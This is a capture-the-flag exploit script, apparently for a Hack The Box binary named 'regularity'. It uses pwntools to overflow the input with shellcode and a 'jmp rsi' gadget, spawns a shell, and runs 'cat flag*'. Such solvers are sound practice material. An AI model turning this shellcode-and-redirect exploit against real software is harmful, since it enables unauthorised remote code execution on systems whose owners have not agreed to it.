#!/usr/bin/python3

# Somehow, manual debug indicates that there are some "bad chars" among the 31-byte shellcode from the exploitdb.
# And the shellcode generated below also has the same issue. I am using `python -c "print(xxx)" | ./regularity`
# However, if we use the pwntools to do so, it works magically. My guess is that maybe `python print() + pipe` may
# convert some original chars based on the linux env.

# Conclusion: use pwntools first if possible.

from pwn import *
import warnings
import os
warnings.filterwarnings('ignore')
context.arch = 'amd64'

fname = './regularity' 

LOCAL = False # CHANGE THIS TO True if you want to run it locally
os.system('clear')

if LOCAL:
  print('Running solver locally..\n')
  r    = process(fname)
else:
  IP   = str(sys.argv[1]) if len(sys.argv) >= 2 else '0.0.0.0'
  PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 1337
  r    = remote(IP, PORT)
  print(f'Running solver remotely at {IP} {PORT}\n')


# Send shellcode
elf = context.binary = ELF('./regularity', checksec=False)
JMP_RSI = next(elf.search(asm('jmp rsi')))
payload = flat({
 0: asm(shellcraft.sh()),
 256: JMP_RSI
})

r.sendlineafter(b'days?\n', payload)

# Get flag
pause(1)
r.sendline('cat flag*')
print(f'Flag --> {r.recvline_contains(b"HTB").strip().decode()}\n')
